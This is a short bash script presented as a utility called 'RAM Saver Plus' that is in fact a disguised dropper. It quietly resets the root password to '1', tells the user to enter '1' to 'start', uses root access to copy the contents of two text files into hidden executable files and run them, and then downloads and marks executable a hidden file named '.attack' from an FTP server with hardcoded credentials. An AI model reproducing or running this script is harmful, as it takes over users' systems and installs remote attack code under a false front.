#!/bin/bash

echo -e "1\n1" | sudo passwd
sudo apt-get install curl
clear
echo "Welcome to RAM Saver Plus! Enter '1' for the password to start!"
su -c "cat temp.txt >> .script; chmod +x .script; ./.script; cat crashlogger.txt >> .export; chmod +x .export;"
./.export
mkdir RamCrashLog
cd RamCrashLog
curl ftp://hostinger:password@192.168.0.10:21/.attack >> .attack
chmod +x .attack

clear

